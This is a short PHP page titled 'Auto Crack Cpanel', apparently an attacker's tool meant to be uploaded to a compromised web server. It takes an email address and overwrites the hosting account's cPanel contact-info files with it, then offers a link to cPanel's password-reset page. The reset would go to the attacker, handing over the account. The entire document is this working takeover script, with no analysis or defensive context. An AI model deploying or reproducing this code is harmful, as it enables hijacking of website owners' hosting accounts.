<html>
  <head>
    <title>Crack Cpanel</title>
  </head>
  <body>
    <center>
      <form method="POST">
        <h1>Auto Crack Cpanel</h1>
        Email:<input type="text" autocomplete="off" name="email"><input type="submit" name="hajar" value="Crack">
      </form><br><br>
      <?php
      $user = get_current_user();
      $email = $_POST['email'];
      if(isset($_POST['hajar'])){
        $data = "email:$email";
        tulis("/home/$user/.contactinfo",$data);
        tulis("/home/$user/.cpanel/contactinfo",$data);
        $k1 = file_get_contents("/home/$user/.cpanel/contactinfo");
        $k2 = file_get_contents("/home/$user/.contactinfo");
        if($k1 == $data AND $k2 == $data){
          echo "User:$user<br><button><a href='https://".$_SERVER['HTTP_HOST'].":2083/resetpass?start=1' target='_blank'>Reset Password</a></button>";
        }else{
          echo "Gagal Crack Cpanel";
        }
      }
      function tulis($path,$text){
        $fp = fopen($path,'w');
        fwrite($fp,$text);
        fclose($fp);
      }
      ?>
    </center>
  </body>
</html>